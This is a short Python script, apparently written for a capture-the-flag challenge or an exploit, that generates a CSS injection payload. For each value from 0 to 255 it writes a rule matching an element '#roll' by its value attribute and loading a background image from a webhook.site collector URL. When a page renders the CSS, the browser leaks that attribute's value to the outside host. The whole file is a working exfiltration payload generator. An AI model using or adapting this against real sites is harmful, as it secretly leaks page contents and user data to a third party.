payload = ""
url = "https://webhook.site/cf759709-628c-400c-a925-7c7762c2a8ca?c="

for i in range(0, 256):
    payload += "#roll[value=\"" + str(i) + "\"]{background-image: url(" + url + str(i) + ")}\n"

with open("payload.css", "w") as f:
    f.write(payload)